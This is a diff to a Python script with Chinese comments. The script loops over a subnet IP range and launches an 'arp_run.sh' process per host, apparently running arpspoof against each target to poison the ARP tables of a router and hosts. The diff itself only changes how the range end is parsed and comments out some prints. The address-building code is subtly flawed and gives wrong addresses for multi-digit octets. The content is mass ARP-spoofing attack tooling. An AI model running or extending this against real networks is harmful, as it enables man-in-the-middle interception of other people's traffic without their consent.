@@ -34,16 +34,17 @@ try:
     else:
         netResult  = result.n.split('-')
         processes = []
-        for targetIP in range(int(netResult[0].split('.')[-1]), int(netResult[1].split('.')[-1]) + 1):
+        for targetIP in range(int(netResult[0].split('.')[-1]), int(netResult[1]) + 1):
             # 以异步方式运行 arpspoof
             if netResult[0][:-1:] + str(targetIP) in result.s:
                 continue
-            print(netResult[0][:-1:] + str(targetIP))
+            # print(netResult[0][:-1:] + str(targetIP))
             proc = subprocess.Popen(['bash', result.f or 'arp_run.sh', netResult[0][:-1:] + str(targetIP), result.r, result.i or 'eth0'])
             processes.append(proc)
 
         for proc in processes:
             # 等待所有的 arpspoof 进程完成
             proc.wait()
+        # print(result.r)
 except Exception as e:
     print(e)
